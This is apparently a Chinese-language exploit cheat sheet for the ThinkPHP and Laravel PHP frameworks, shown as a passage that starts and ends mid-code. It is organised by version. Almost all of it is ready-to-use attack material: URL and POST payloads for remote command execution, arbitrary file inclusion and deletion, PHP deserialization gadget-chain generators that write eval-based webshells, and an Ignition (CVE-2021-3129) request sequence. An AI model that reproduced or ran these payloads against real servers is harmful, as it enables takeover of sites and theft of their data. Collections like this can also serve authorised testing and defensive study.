$this-&gt;data[$this-&gt;pk]=array( &quot;table&quot;=&gt;&quot;mysql.user where 1=updatexml(1,concat(0x7e,user()),1)#&quot;, &quot;where&quot;=&gt;&quot;1=1&quot; ); $this-&gt;db=new Mysql(); &#125;&#125;namespace Think\\Db\\Driver;use PDO;class Mysql&#123; protected $options ; protected $config ; public function __construct()&#123; $this-&gt;options= array(PDO::MYSQL_ATTR_LOCAL_INFILE =&gt; true ); // 开启才能读取文件 $this-&gt;config= array( &quot;debug&quot; =&gt; 1, &quot;database&quot; =&gt; &quot;mysql&quot;, &quot;hostname&quot; =&gt; &quot;127.0.0.1&quot;, &quot;hostport&quot; =&gt; &quot;3306&quot;, &quot;charset&quot; =&gt; &quot;utf8&quot;, &quot;username&quot; =&gt; &quot;root&quot;, &quot;password&quot; =&gt; &quot;root&quot; ); &#125;&#125;use Think\\Image\\Driver\\Imagick;echo base64_encode(serialize(new Imagick())); 5.0.x 通用 文件包含 Thinkphp 多语言功能导致的任意文件包含 ?lang=../../../../../public/index http://tttang.com/archive/1865/ 5.0.7&lt;=ver&lt;=5.0.22 未开启强制路由RCE ?s=index/think\\config/get&amp;name=database.username ?s=index/think\\config/get&amp;name=database.password ?s=index/\\think\\Lang/load&amp;file=../../test.jpg ?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami ?s=index POST: _method=__construct&amp;method=get&amp;filter[]=call_user_func&amp;get[]=phpinfo ?s=index POST: _method=__construct&amp;filter[]=system&amp;method=GET&amp;get[]=whoami &lt;5.0.23 ThinkPHP 5.0.0~5.0.23 Request类任意方法调用导致RCE漏洞分析 RCE index.php?s=/index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=php%20-r%20&#39;phpinfo();&#39; index.php?s=captcha POST: _method=__construct&amp;filter[]=system&amp;method=GET&amp;get[]=whoami index.php?s=index/index POST: _method=__construct&amp;filter[]=system&amp;method=GET&amp;get[]=whoami 任意文件包含 index.php?s=captcha POST: _method=__construct&amp;method=GET&amp;filter[]=think__include_file&amp;server[]=1&amp;get[]=/etc/passwd &lt;5.0.12 RCE index.php?s=index/index POST: _method=__construct&amp;filter[]=system&amp;method=POST&amp;s=whoami 5.0.21-5.0.23 RCE index.php?s=captcha POST: _method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=whoami 5.0.24 反序列化 ThinkPHP v5.0.x 反序列化利用链挖掘 生成phar： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125&lt;?phpnamespace think\\process\\pipes &#123; class Windows &#123; private $files = []; public function __construct($files) &#123; $this-&gt;files = [$files]; &#125; &#125;&#125;namespace think &#123; abstract class Model&#123; protected $append = []; protected $error = null; public $parent; function __construct($output, $modelRelation) &#123; $this-&gt;parent = $output; $this-&gt;append = array(&quot;xxx&quot;=&gt;&quot;getError&quot;); $this-&gt;error = $modelRelation; &#125; &#125;&#125;namespace think\\model&#123; use think\\Model; class Pivot extends Model&#123; function __construct($output, $modelRelation) &#123; parent::__construct($output, $modelRelation); &#125; &#125;&#125;namespace think\\model\\relation&#123; class HasOne extends OneToOne &#123; &#125;&#125;namespace think\\model\\relation &#123; abstract class OneToOne &#123; protected $selfRelation; protected $bindAttr = []; protected $query; function __construct($query) &#123; $this-&gt;selfRelation = 0; $this-&gt;query = $query; //$query指向Query $this-&gt;bindAttr = [&#x27;xxx&#x27;];// $value值，作为call函数引用的第二变量 &#125; &#125;&#125;namespace think\\db &#123; class Query &#123; protected $model; function __construct($model) &#123; $this-&gt;model = $model; //$this-&gt;model=&gt; think\\console\\Output; &#125; &#125;&#125;namespace think\\console&#123; class Output&#123; private $handle; protected $styles; function __construct($handle) &#123; $this-&gt;styles = [&#x27;getAttr&#x27;]; $this-&gt;handle =$handle; //$handle-&gt;think\\session\\driver\\Memcached &#125; &#125;&#125;namespace think\\session\\driver &#123; class Memcached &#123; protected $handler; function __construct($handle) &#123; $this-&gt;handler = $handle; //$handle-&gt;think\\cache\\driver\\File &#125; &#125;&#125;namespace think\\cache\\driver &#123; class File &#123; protected $options=null; protected $tag; function __construct()&#123; $this-&gt;options=[ &#x27;expire&#x27; =&gt; 3600, &#x27;cache_subdir&#x27; =&gt; false, &#x27;prefix&#x27; =&gt; &#x27;&#x27;, &#x27;path&#x27; =&gt; &#x27;php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../../../../../../../../../../var/www/html/&#x27;, &#x27;data_compress&#x27; =&gt; false, ]; $this-&gt;tag = &#x27;xxx&#x27;; &#125; &#125;&#125;namespace &#123; $Memcached = new think\\session\\driver\\Memcached(new \\think\\cache\\driver\\File()); $Output = new think\\console\\Output($Memcached); $model = new think\\db\\Query($Output); $HasOne = new think\\model\\relation\\HasOne($model); $window = new think\\process\\pipes\\Windows(new think\\model\\Pivot($Output,$HasOne)); $phar = new Phar(&quot;phar.phar&quot;); $phar-&gt;startBuffering(); $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); $phar-&gt;setMetadata($window); $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); $phar-&gt;stopBuffering();&#125; 5.1.x 通用 未开启强制路由RCE ?s=index/\\think\\Request/input&amp;filter[]=system&amp;data=pwd ?s=index/\\think\\request/input?data[]=-1&amp;filter=phpinfo ?s=index/\\think\\view\\driver\\Php/display&amp;content=&lt;?php phpinfo();?&gt; ?s=index/\\think\\view\\driver\\Think/display&amp;template=&lt;?php phpinfo();?&gt; ?s=index/\\think\\view\\driver\\Think/__call&amp;method=display&amp;params[]=&lt;?php system(&#39;whoami&#39;); ?&gt; ?s=index/\\think\\template\\driver\\file/write&amp;cacheFile=shell.php&amp;content=&lt;?php phpinfo();?&gt; ?s=index/\\think\\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id ?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id ?s=/index/\\think\\request/cache&amp;key=1|phpinfo ?s=/index/\\think\\request/cache&amp;key=ls|system 任意文件删除 存在位置：\\thinkphp\\library\\think\\process\\pipes\\Windows.php 12345678910&lt;?phpnamespace think\\process\\pipes;class Pipes &#123;&#125;class Windows extends Pipes &#123; private $files = []; public function __construct() &#123; $this-&gt;files = [&#x27;tmp.txt&#x27;]; &#125;&#125;echo base64_encode(serialize(new Windows())); 文件包含 Thinkphp 多语言功能导致的任意文件包含 ?lang=../../../../../public/index http://tttang.com/archive/1865/ 5.1.31 RCE index.php?s=/index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=php%20-r%20&#39;phpinfo();&#39; 5.1.38 反序列化 thinkPHP5.1整理 index.php?sss=whoami POST: data=xxxxxx 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;?phpnamespace think;abstract class Model&#123; protected $append = []; private $data = []; function __construct()&#123; $this-&gt;append = [&quot;sss&quot;=&gt;[&quot;calc.exe&quot;,&quot;calc&quot;]]; $this-&gt;data = [&quot;sss&quot;=&gt;new Request()]; &#125;&#125;class Request&#123; protected $hook = []; protected $filter = &quot;system&quot;; protected $config = [ // 表单ajax伪装变量 &#x27;var_ajax&#x27; =&gt; &#x27;_ajax&#x27;, ]; function __construct()&#123; $this-&gt;filter = &quot;system&quot;; $this-&gt;config = [&quot;var_ajax&quot;=&gt;&#x27;lin&#x27;]; $this-&gt;hook = [&quot;visible&quot;=&gt;[$this,&quot;isAjax&quot;]]; &#125;&#125;namespace think\\process\\pipes;use think\\model\\concern\\Conversion;use think\\model\\Pivot;class Windows&#123; private $files = []; public function __construct() &#123; $this-&gt;files=[new Pivot()]; &#125;&#125;namespace think\\model;use think\\Model;class Pivot extends Model&#123;&#125;use think\\process\\pipes\\Windows;echo urlencode(serialize(new Windows()));?&gt; 6.0.x 通用 反序列化 ThinkPHP V6.0.x 反序列化漏洞 a. 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?phpnamespace think\\model\\concern;trait Attribute&#123; private $data; private $withAttr;&#125;trait ModelEvent&#123; protected $withEvent;&#125;namespace think;abstract class Model&#123; use model\\concern\\Attribute; use model\\concern\\ModelEvent; private $exists; private $force; private $lazySave; protected $suffix; function __construct($a = &#x27;&#x27;) &#123; $func = function()&#123;phpinfo();&#125;; $b=\\Opis\\Closure\\serialize($func); $this-&gt;exists = true; $this-&gt;force = true; $this-&gt;lazySave = true; $this-&gt;withEvent = false; $this-&gt;suffix = $a; $this-&gt;data=[&#x27;x&#x27;=&gt;&#x27;&#x27;]; $c=unserialize($b); $this-&gt;withAttr=[&#x27;x&#x27;=&gt;$c]; &#125;&#125;namespace think\\model;use think\\Model;class Pivot extends Model&#123;&#125;require &#x27;closure/autoload.php&#x27;;echo urlencode(serialize(new Pivot(new Pivot()))); b. 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?phpnamespace think\\model\\concern;trait Attribute&#123; private $data = [&quot;key&quot; =&gt; [&quot;key1&quot; =&gt; &quot;whoami&quot;]]; private $withAttr = [&quot;key&quot;=&gt;[&quot;key1&quot;=&gt;&quot;system&quot;]]; protected $json = [&quot;key&quot;];&#125;namespace think;abstract class Model&#123; use model\\concern\\Attribute; private $lazySave; protected $withEvent; private $exists; private $force; protected $table; protected $jsonAssoc; function __construct($obj = &#x27;&#x27;) &#123; $this-&gt;lazySave = true; $this-&gt;withEvent = false; $this-&gt;exists = true; $this-&gt;force = true; $this-&gt;table = $obj; $this-&gt;jsonAssoc = true; &#125;&#125;namespace think\\model;use think\\Model;class Pivot extends Model&#123;&#125;$a = new Pivot();$b = new Pivot($a);echo urlencode(serialize($b)); 文件包含 Thinkphp 多语言功能导致的任意文件包含，版本要求 ThinkPHP v6.0.1 &lt;= v6.0.x &lt;= v6.0.13 ?lang=../../../../../public/index http://tttang.com/archive/1865/ 其他 tp6.0.8反序列化漏洞分析 a. 123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;?phpnamespace League\\Flysystem\\Cached\\Storage;abstract class AbstractCache &#123;&#125;namespace think\\cache;use think\\cache\\Driver;abstract class Driver &#123;&#125;namespace think\\cache\\driver;use think\\cache\\driver;class File extends Driver &#123; protected $options = []; public function __construct() &#123; $this-&gt;options = [ &#x27;expire&#x27; =&gt; 0, &#x27;cache_subdir&#x27; =&gt; false, &#x27;prefix&#x27; =&gt; &#x27;&#x27;, &#x27;path&#x27; =&gt; &#x27;&#x27;, &#x27;hash_type&#x27; =&gt; &#x27;md5&#x27;, &#x27;data_compress&#x27; =&gt; false, &#x27;tag_prefix&#x27; =&gt; &#x27;tag:&#x27;, &#x27;serialize&#x27;=&gt; [&#x27;system&#x27;] ]; &#125;&#125;namespace think\\filesystem;use League\\Flysystem\\Cached\\Storage\\AbstractCache;class CacheStore extends AbstractCache &#123; protected $store; protected $key; protected $autosave; protected $complete; public function __construct($store) &#123; $this-&gt;autosave = false; $this-&gt;key = &quot;1&quot;; $this-&gt;complete = &#x27;`sleep 10`&#x27;; $this-&gt;store = $store; &#125;&#125;use think\\cache\\driver\\file;$a = new CacheStore(new File());echo serialize($a);echo &quot;&lt;/br&gt;&quot;;echo urlencode(serialize($a));?&gt; b. https://www.heibai.org/1604.htmlhttps://www.cnblogs.com/20175211lyz/p/13639789.htmlhttps://new.qq.com/omn/20200629/20200629A0RG1800.html 12345678910111213141516171819202122232425262728293031323334353637383940414243444546&lt;?phpnamespace League\\Flysystem\\Cached\\Storage;abstract class AbstractCache &#123;&#125;namespace think\\cache;use think\\cache\\Driver;abstract class Driver &#123;&#125;namespace think\\cache\\driver;use think\\cache\\driver;class File extends Driver &#123; protected $options = []; public function __construct() &#123; $this-&gt;options = [ &#x27;expire&#x27; =&gt; 0, &#x27;cache_subdir&#x27; =&gt; false, &#x27;prefix&#x27; =&gt; &#x27;&#x27;, &#x27;path&#x27; =&gt; &#x27;php://filter/write=convert.base64-decode/resource=./&#x27;, &#x27;hash_type&#x27; =&gt; &#x27;md5&#x27;, &#x27;data_compress&#x27; =&gt; false, &#x27;tag_prefix&#x27; =&gt; &#x27;tag:&#x27;, &#x27;serialize&#x27;=&gt; [&#x27;trim&#x27;] //使用trim去掉[] ]; &#125;&#125;namespace think\\filesystem;use League\\Flysystem\\Cached\\Storage\\AbstractCache;class CacheStore extends AbstractCache &#123; protected $store; protected $key; protected $autosave; protected $complete; public function __construct($store) &#123; $this-&gt;autosave = false; $this-&gt;key = &quot;1&quot;; $this-&gt;complete = &#x27;uuuPDw/cGhwIHBocGluZm8oKTtldmFsKCRfR0VUWzFdKTs/PiA=&#x27;; $this-&gt;store = $store; &#125;&#125;use think\\cache\\driver\\file;$a = new CacheStore(new File());echo serialize($a);echo &quot;&lt;/br&gt;&quot;;echo urlencode(serialize($a));?&gt; c. https://yq1ng.github.io/z_post/ctfshow-thinkphp%E4%B8%93%E9%A2%98/ 12345678910111213141516171819202122232425262728/*** @Author ying* @Date 8/20/2021 5:01 PM* @Version 1.0*/namespace League\\Flysystem\\Cached\\Storage &#123; use League\\Flysystem\\Adapter\\Local; class Adapter &#123; protected $autosave = true; protected $expire = null; protected $adapter; protected $file; public function __construct() &#123; $this-&gt;autosave = false; $this-&gt;expire = &#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;; $this-&gt;adapter = new Local(); $this-&gt;file = &#x27;yq1ng.php&#x27;; &#125; &#125;&#125;namespace League\\Flysystem\\Adapter &#123; class Local &#123; &#125;&#125;namespace &#123; use League\\Flysystem\\Cached\\Storage\\Adapter; echo urlencode(serialize(new Adapter()));&#125; ​ Laravel版本vendor/laravel/framework/src/Illuminate/Foundation/Application.php 5.1 5.1.x 反序列化+RCE a. 12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;?phpnamespace&#123; use Mockery\\Generator\\DefinedTargetClass; class Swift_KeyCache_DiskKeyCache&#123; private $_keys=[&#x27;bit&#x27;=&gt;array(&#x27;bit&#x27;=&gt;&#x27;bit&#x27;)]; private $_path; public function __construct($cmd)&#123; $this-&gt;_path=new DefinedTargetClass($cmd); &#125; &#125; echo urlencode(serialize(new Swift_KeyCache_DiskKeyCache($argv[1])));&#125;namespace Mockery\\Generator&#123; use Faker\\ValidGenerator; class DefinedTargetClass &#123; private $rfc; public function __construct($cmd) &#123; $this-&gt;rfc=new ValidGenerator($cmd); &#125; &#125;&#125;namespace Faker&#123; class DefaultGenerator&#123; protected $default; public function __construct($cmd) &#123; $this-&gt;default = $cmd; &#125; &#125; class ValidGenerator &#123; protected $generator; protected $validator; protected $maxRetries; public function __construct($cmd)&#123; $this-&gt;generator=new DefaultGenerator($cmd); $this-&gt;maxRetries=9; $this-&gt;validator=&#x27;system&#x27;; &#125; &#125;&#125; b. 1234567891011121314151617181920212223242526272829303132333435&lt;?phpnamespace&#123; use phpDocumentor\\Reflection\\DocBlock\\Tags\\Deprecated; class Swift_KeyCache_DiskKeyCache&#123; private $_keys=[&#x27;bit&#x27;=&gt;array(&#x27;bit&#x27;=&gt;&#x27;bit&#x27;)]; private $_path; public function __construct($cmd)&#123; $this-&gt;_path=new Deprecated($cmd); &#125; &#125; echo urlencode(serialize(new Swift_KeyCache_DiskKeyCache($argv[1])));&#125;namespace phpDocumentor\\Reflection\\DocBlock\\Tags&#123; use Illuminate\\Database\\DatabaseManager; abstract class BaseTag&#123; protected $description; &#125; final class Deprecated extends BaseTag&#123; public function __construct($cmd)&#123; $this-&gt;description=new DatabaseManager($cmd); &#125; &#125;&#125;namespace Illuminate\\Database&#123; class DatabaseManager&#123; protected $app; protected $extensions ; public function __construct($cmd) &#123; $this-&gt;app[&#x27;config&#x27;][&#x27;database.default&#x27;]=$cmd; $this-&gt;app[&#x27;config&#x27;][&#x27;database.connections&#x27;]=array($cmd=&gt;&#x27;system&#x27;); $this-&gt;extensions[$cmd]=&#x27;call_user_func&#x27;; &#125; &#125;&#125; c. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869&lt;?phpnamespace&#123; use Prophecy\\Argument\\Token\\ObjectStateToken; class Swift_KeyCache_DiskKeyCache&#123; private $_keys=[&#x27;bit&#x27;=&gt;array(&#x27;bit&#x27;=&gt;&#x27;bit&#x27;)]; private $_path; public function __construct($cmd)&#123; $this-&gt;_path=new ObjectStateToken($cmd); &#125; &#125; echo urlencode(serialize(new Swift_KeyCache_DiskKeyCache($argv[1])));&#125;namespace Prophecy\\Argument\\Token&#123; use Mockery\\Generator\\MockDefinition; use Illuminate\\Validation\\Validator; class ObjectStateToken&#123; private $name; private $value; private $util; public function __construct($cmd)&#123; $this-&gt;name=&#x27;bit&#x27;; $this-&gt;value=new MockDefinition($cmd); $this-&gt;util=new Validator(); &#125; &#125;&#125;namespace Illuminate\\Validation&#123; use Faker\\DefaultGenerator; class Validator&#123; protected $container; protected $extensions = []; public function __construct()&#123; $this-&gt;extensions[&#x27;y&#x27;]=&#x27;xxx@load&#x27;; $this-&gt;container=new DefaultGenerator(); &#125; &#125;&#125;namespace Faker&#123; use Mockery\\Loader\\EvalLoader; class DefaultGenerator &#123; protected $default; public function __construct() &#123; $this-&gt;default = new EvalLoader(); &#125; &#125;&#125;namespace Mockery\\Loader&#123; class EvalLoader&#123;&#125;&#125;namespace Mockery\\Generator&#123; use Illuminate\\Session\\Store; class MockDefinition&#123; protected $config; protected $code; public function __construct($cmd)&#123; $this-&gt;config=new Store(); $this-&gt;code=$cmd; &#125; &#125;&#125;namespace Illuminate\\Session&#123; class Store&#123; protected $name=&#x27;bit&#x27;;//类不存在就行 &#125;&#125; 5.4.x 5.4.30 反序列化（5.4-5.8） Laravel5.4 反序列化漏洞挖掘 a. Illuminate/Support/Manager.php::__call -&gt; driver() -&gt; Illuminate/Notifications/ChannelManager.php 123456789101112131415161718192021222324252627282930313233&lt;?phpnamespace Illuminate\\Broadcasting&#123; use Illuminate\\Notifications\\ChannelManager; class PendingBroadcast &#123; protected $events; public function __construct($cmd) &#123; $this-&gt;events = new ChannelManager($cmd); &#125; &#125; echo base64_encode(serialize(new PendingBroadcast($argv[1])));&#125;namespace Illuminate\\Notifications&#123; class ChannelManager &#123; protected $app; protected $defaultChannel; protected $customCreators; public function __construct($cmd) &#123; $this-&gt;app = $cmd; $this-&gt;customCreators = [&#x27;x&#x27; =&gt; &#x27;system&#x27;]; $this-&gt;defaultChannel = &#x27;x&#x27;; &#125; &#125;&#125; b. Illuminate/Validation/Validator.php::__call 12345678910111213141516171819202122232425&lt;?phpnamespace Illuminate\\Broadcasting&#123; use Illuminate\\Validation\\Validator; class PendingBroadcast &#123; protected $events; protected $event; public function __construct($cmd) &#123; $this-&gt;events = new Validator(); $this-&gt;event=$cmd; &#125; &#125; echo base64_encode(serialize(new PendingBroadcast($argv[1])));&#125;namespace Illuminate\\Validation&#123; class Validator &#123; public $extensions = [&#x27;&#x27;=&gt;&#x27;system&#x27;]; &#125;&#125; c. Illuminate/Events/Dispatcher.php 12345678910111213141516171819202122232425262728&lt;?phpnamespace Illuminate\\Broadcasting&#123; use Illuminate\\Events\\Dispatcher; class PendingBroadcast &#123; protected $events; protected $event; public function __construct($cmd) &#123; $this-&gt;events = new Dispatcher($cmd); $this-&gt;event=$cmd; &#125; &#125; echo base64_encode(serialize(new PendingBroadcast($argv[1])));&#125;namespace Illuminate\\Events&#123; class Dispatcher &#123; protected $listeners; public function __construct($event)&#123; $this-&gt;listeners=[$event=&gt;[&#x27;system&#x27;]]; &#125; &#125;&#125; d. Illuminate/Bus/Dispatcher.php 12345678910111213141516171819202122232425262728293031&lt;?phpnamespace Illuminate\\Bus&#123;class Dispatcher&#123; protected $queueResolver; public function __construct()&#123; $this-&gt;queueResolver = &quot;system&quot;; &#125;&#125;&#125;namespace Illuminate\\Broadcasting&#123; use Illuminate\\Bus\\Dispatcher; class BroadcastEvent&#123; public $connection; public function __construct($cmd)&#123; $this-&gt;connection = $cmd; &#125; &#125; class PendingBroadcast&#123; protected $events; protected $event; public function __construct($event)&#123; $this-&gt;events = new Dispatcher(); $this-&gt;event = new BroadcastEvent($event); &#125; &#125; echo base64_encode(serialize(new PendingBroadcast($argv[1]))); &#125;?&gt; e. Mockery/Loader/EvalLoader.php 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&lt;?phpnamespace Illuminate\\Bus&#123; use Mockery\\Loader\\EvalLoader; class Dispatcher&#123; protected $queueResolver; public function __construct()&#123; $this-&gt;queueResolver = [new EvalLoader(),&#x27;load&#x27;]; &#125;&#125;&#125;namespace Illuminate\\Broadcasting&#123; use Illuminate\\Bus\\Dispatcher; use Mockery\\Generator\\MockDefinition; class BroadcastEvent&#123; public $connection; public function __construct($code)&#123; $this-&gt;connection = new MockDefinition($code); &#125; &#125; class PendingBroadcast&#123; protected $events; protected $event; public function __construct($event)&#123; $this-&gt;events = new Dispatcher(); $this-&gt;event = new BroadcastEvent($event); &#125; &#125;echo base64_encode(serialize(new PendingBroadcast($argv[1]))); &#125;namespace Mockery\\Loader&#123; class EvalLoader&#123;&#125;&#125;namespace Mockery\\Generator&#123; use Illuminate\\Session\\Store; class MockDefinition&#123; protected $config; protected $code; public function __construct($code)&#123; $this-&gt;config=new Store(); $this-&gt;code=$code; &#125; &#125;&#125;namespace Illuminate\\Session&#123; class Store&#123; protected $name=&#x27;x&#x27;;//类不存在 &#125;&#125;?&gt; 5.7.x 5.7.29 反序列化+RCE 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758//不用PendingCommand.php&lt;?phpnamespace Symfony\\Component\\Routing\\Loader\\Configurator &#123; class ImportConfigurator &#123; private $parent; public function __construct($parent) &#123; $this-&gt;parent = $parent; &#125; &#125;&#125;namespace Faker &#123; class DefaultGenerator&#123; protected $default; public function __construct($default) &#123; $this-&gt;default = $default; &#125; public function __call($method, $attributes) &#123; return $this-&gt;default; &#125; &#125; class ValidGenerator &#123; protected $generator; protected $validator; protected $maxRetries; public function __construct($validator,$generator) &#123; $this-&gt;generator = new DefaultGenerator($generator); $this-&gt;validator = $validator; $this-&gt;maxRetries = 1; &#125; public function __call($name, $arguments) &#123; $i = 0; do &#123; $res = call_user_func_array(array($this-&gt;generator, $name), $arguments); $i++; if ($i &gt; $this-&gt;maxRetries) &#123; throw new \\OverflowException(sprintf(&#x27;Maximum retries of %d reached without finding a valid value&#x27;, $this-&gt;maxRetries)); &#125; &#125; while (!call_user_func($this-&gt;validator, $res)); return $res; &#125; &#125;&#125;namespace &#123; $a = new Faker\\ValidGenerator(&quot;system&quot;,&quot;cat /flag&quot;); $b = new Symfony\\Component\\Routing\\Loader\\Configurator\\ImportConfigurator($a); echo urlencode(serialize($b));&#125; 7.x 7.30 反序列化+RCE a. 12345678910111213141516171819202122232425&lt;?phpnamespace Illuminate\\Routing&#123; use Illuminate\\Validation\\Validator; class PendingResourceRegistration &#123; protected $registrar; protected $registered = false; protected $name=&#x27;call_user_func&#x27;; protected $controller=&#x27;system&#x27;; protected $options; public function __construct($cmd)&#123; $this-&gt;registrar=new Validator(); $this-&gt;options=$cmd; &#125; &#125; echo urlencode(serialize(new PendingResourceRegistration($argv[1])));&#125;namespace Illuminate\\Validation&#123; class Validator&#123; public $extensions = []; public function __construct()&#123; $this-&gt;extensions[&#x27;&#x27;]=&#x27;call_user_func&#x27;; &#125; &#125;&#125; b. 12345678910111213141516171819202122232425262728293031323334&lt;?phpnamespace Illuminate\\Routing&#123; use Illuminate\\View\\InvokableComponentVariable; class PendingResourceRegistration &#123; protected $registrar; protected $registered = false; public function __construct()&#123; $this-&gt;registrar=new InvokableComponentVariable(); &#125; &#125; echo urlencode(serialize(new PendingResourceRegistration()));&#125;namespace Illuminate\\View&#123; use PHPUnit\\Framework\\MockObject\\MockClass; class InvokableComponentVariable&#123; protected $callable; public function __construct()&#123; $this-&gt;callable=array(new MockClass(),&#x27;generate&#x27;); &#125; &#125;&#125;namespace PHPUnit\\Framework\\MockObject&#123; class MockClass&#123; private $classCode; private $mockName; private $configurableMethods; public function __construct()&#123; $this-&gt;classCode=&#x27;eval($_POST[&quot;cmd&quot;]);&#x27;; $this-&gt;mockName=&#x27;bit&#x27;; $this-&gt;configurableMethods=&#x27;bit&#x27;; &#125; &#125;&#125; 8.x 8.26.1 RCE CVE-2021-3129 当Laravel开启了Debug模式时，由于Laravel自带的Ignition 组件对file_get_contents()和file_put_contents()函数的不安全使用，攻击者可以通过发起恶意请求，构造恶意Log文件等方式触发Phar反序列化，最终造成远程代码执行。 1234567891011POST /_ignition/execute-solution HTTP/1.1Host: 192.168.160.130:8077Content-Type: application/jsonContent-Length: 168&#123; &quot;solution&quot;: &quot;Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution&quot;, &quot;parameters&quot;: &#123; &quot;variableName&quot;: &quot;username&quot;, &quot;viewFile&quot;: &quot;xxxxxxx&quot; &#125;&#125; 页面出现了Ignition的报错，说明漏洞存在，且开启了debug模式。 使用如下数据包清除日志文件： 1234567891011POST /_ignition/execute-solution HTTP/1.1Host: 192.168.160.130:8077Content-Type: application/jsonContent-Length: 328&#123; &quot;solution&quot;: &quot;Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution&quot;, &quot;parameters&quot;: &#123; &quot;variableName&quot;: &quot;username&quot;, &quot;viewFile&quot;: &quot;php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log&quot; &#125;&#125; 9.x 9.1.8 反序列化+RCE https://github.com/1nhann/vulns/issues a. 123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;?phpnamespace Illuminate\\Contracts\\Queue&#123; interface ShouldQueue &#123; &#125;&#125;namespace Illuminate\\Bus&#123; class Dispatcher&#123; protected $container; protected $pipeline; protected $pipes = []; protected $handlers = []; protected $queueResolver; function __construct() &#123; $this-&gt;queueResolver = &quot;system&quot;; &#125; &#125;&#125;namespace Illuminate\\Broadcasting&#123; use Illuminate\\Contracts\\Queue\\ShouldQueue; class BroadcastEvent implements ShouldQueue &#123; function __construct() &#123; &#125; &#125; class PendingBroadcast&#123; protected $events; protected $event; function __construct() &#123; $this-&gt;event = new BroadcastEvent(); $this-&gt;event-&gt;connection = &quot;whoami&quot;; $this-&gt;events = new \\Illuminate\\Bus\\Dispatcher(); &#125; &#125;&#125;namespace&#123; $a = new \\Illuminate\\Broadcasting\\PendingBroadcast(); echo base64_encode(serialize($a));&#125; b. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&lt;?phpnamespace Faker&#123; class Generator&#123; protected $providers = []; protected $formatters = []; function __construct() &#123; $this-&gt;formatter = &quot;register&quot;; $this-&gt;formatters = 9999; &#125; &#125;&#125;namespace Illuminate\\Routing&#123; class PendingResourceRegistration&#123; protected $registrar; protected $name; protected $controller; protected $options = []; protected $registered = false; function __construct() &#123; $this-&gt;registrar = new \\Faker\\Generator(); $this-&gt;name = &quot;d:/var/www/untitiled/public/1.php&quot;; $this-&gt;controller = &#x27;&lt;?php phpinfo();?&gt;&#x27;; $this-&gt;options = 8; &#125; &#125;&#125;namespace Symfony\\Component\\Mime\\Part&#123; abstract class AbstractPart &#123; private $headers = null; &#125; class SMimePart extends AbstractPart&#123; protected $_headers; public $inhann; function __construct()&#123; $this-&gt;_headers = [&quot;register&quot;=&gt;&quot;file_put_contents&quot;]; $this-&gt;inhann = new \\Illuminate\\Routing\\PendingResourceRegistration(); &#125; &#125;&#125;namespace&#123; $a = new \\Symfony\\Component\\Mime\\Part\\SMimePart(); $ser = preg_replace(&quot;/([^\\&#123;]*\\&#123;)(.*)(s:49.*)(\\&#125;)/&quot;,&quot;\\\\1\\\\3\\\\2\\\\4&quot;,serialize($a)); echo base64_encode(str_replace(&quot;i:9999&quot;,&quot;R:2&quot;,$ser));&#125; c. 1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;?phpnamespace GuzzleHttp\\Cookie&#123; class SetCookie &#123; private static $defaults = [ &#x27;Name&#x27; =&gt; null, &#x27;Value&#x27; =&gt; null, &#x27;Domain&#x27; =&gt; null, &#x27;Path&#x27; =&gt; &#x27;/&#x27;, &#x27;Max-Age&#x27; =&gt; null, &#x27;Expires&#x27; =&gt; null, &#x27;Secure&#x27; =&gt; false, &#x27;Discard&#x27; =&gt; false, &#x27;HttpOnly&#x27; =&gt; false ]; function __construct() &#123; $this-&gt;data[&#x27;Expires&#x27;] = &#x27;&lt;?php phpinfo();?&gt;&#x27;; $this-&gt;data[&#x27;Discard&#x27;] = 0; &#125; &#125; class CookieJar&#123; private $cookies = []; private $strictMode; function __construct() &#123; $this-&gt;cookies[] = new SetCookie(); &#125; &#125; class FileCookieJar extends CookieJar&#123; private $filename; private $storeSessionCookies; function __construct() &#123; parent::__construct(); $this-&gt;filename = &quot;d:/var/www/untitled/public/shell.php&quot;; $this-&gt;storeSessionCookies = true; &#125; &#125;&#125;namespace&#123; $a = new \\GuzzleHttp\\Cookie\\FileCookieJar(); echo base64_encode(serialize($a));&#125; d. 123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;?phpnamespace Faker&#123; class Generator&#123; protected $providers = []; protected $formatters = []; function __construct() &#123; $this-&gt;formatter = &quot;dispatch&quot;; $this-&gt;formatters = 9999; &#125; &#125;&#125;namespace Illuminate\\Broadcasting&#123; class PendingBroadcast &#123; public function __construct() &#123; $this-&gt;event = &quot;calc.exe&quot;; $this-&gt;events = new \\Faker\\Generator(); &#125; &#125;&#125;namespace 